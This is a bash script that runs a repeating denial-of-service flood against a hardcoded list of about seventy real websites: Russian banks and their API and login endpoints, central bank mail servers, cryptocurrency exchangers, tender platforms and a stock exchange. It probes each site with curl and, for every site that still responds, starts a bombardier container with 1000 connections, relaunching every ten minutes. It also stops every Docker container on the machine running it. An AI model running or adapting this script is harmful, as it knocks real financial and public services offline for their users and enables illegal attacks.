#!/bin/bash

# FILE #2 BANKS & CRYPT SELLING PLATFORMS

# Configuration of Bombardier
BOMBARDIER_TIMEOUT=10m #this is the time of bombardement
BOMBARDIER_CONNECTIONS=1000

declare -a sites=(
"https://api.sberbank.ru/prod/tokens/v2/oauth"
"https://api.sberbank.ru/prod/tokens/v2/oidc"
"https://sberbank.ru"
"https://res.online.sberbank.ru"
"https://test.stat.online.sberbank.ru"
"https://omega.sbrf.ru"
"https://vito.sbrf.ru"
"https://api.spasibosb.ru"
"https://sbermegamarket.ru"
"https://info.spasibosb.ru"
"https://stories-stat.online.sberbank.ru"
"https://content.sberdevices.ru"
"https://catalog.prom.app.sberdevices.ru"
"https://cdn.sberdevices.ru"
"https://www.tinkoff.ru"
"https://www.raiffeisen.ru"
"https://sovcombank.ru"
"https://www.uralsib.ru"
"https://skbbank.ru"
"https://www.bspb.ru"
"https://www.rosbank.ru"
"https://rencredit.ru"
"https://www.homecredit.ru"
"https://www.atb.su/"
"https://www.unicreditbank.ru"
"https://mosoblbank.ru/"
"https://centrinvest.com/"
"https://smpbank.ru/"
"https://www.gazprombank.ru"
"https://www.vtb.ru/"
"https://mx4.cbr.ru"
"http://mx3.cbr.ru"
"http://email11.sberbank.ru"
"http://email12.sberbank.ru"
"http://tatsotsbank.ru/"

#CRYPTO COMES HERE
"https://cleanbtc.ru/"
"https://bonkypay.com/"
"https://changer.club/"
"https://superchange.net"
"https://mine.exchange/"
"https://platov.co"
"https://ww-pay.net/"
"https://delets.cash/"
"https://betatransfer.org"
"https://ramon.money/"
"https://coinpaymaster.com/"
"https://bitokk.biz/"
"https://www.netex24.net"
"https://cashbank.pro/"
"https://flashobmen.com/"
"https://abcobmen.com/"
"https://ychanger.net/"
"https://multichange.net/"
"https://24paybank.ne"
"https://royal.cash/"
"https://prostocash.com/"
"https://baksman.org/"
"https://kupibit.me/"
"https://abcobmen.com"
"https://www.bestchange.ru/"
"https://www.moex.com/"
"https://sbrf.com.ua/"
"https://www.bestchange.ru/"
"https://www.finam.ru/"
"https://sberbank-ast.ru"
"https://etp.roseltorg.ru"
"https://zakazrf.ru"
"https://etp-ets.ru"
"https://rts-tender.ru"
"https://gz.lot-online.ru"
"https://tektorg.ru"
"https://etpgpb.ru"
"https://www.polymetalinternational.com"
)

while :
do
  echo "Stop all containers"
  docker stop $(docker ps -aq)
  echo "Docker containers stopped"

  echo "Run ddos for all sites"
  for site in "${sites[@]}"; do
  
    status_code=$(curl -m 2 -s -o /dev/null  -w "%{http_code}" "$site")
    status_code=$(expr "$status_code" + 0)
    # If status code is zero site is already blocked
  
    site_status="${site} status code ${status_code}"
    echo "$site_status"
  
    if (("$status_code" != 0 && "$status_code" <= 400)); then
      echo "Must be destroyed"
      docker run -ti -d --rm alpine/bombardier -c "$BOMBARDIER_CONNECTIONS" -d "$BOMBARDIER_TIMEOUT" -l "$site"
    fi
  
  done

  echo "DDoS is up and running..."

  #these are SECONDS and they must correspond to BOMBARDIER_TIMEOUT above...in this case it's 10minutes
  sleep 600

  echo "Restarting DDoS, checking which sites are still working"
done
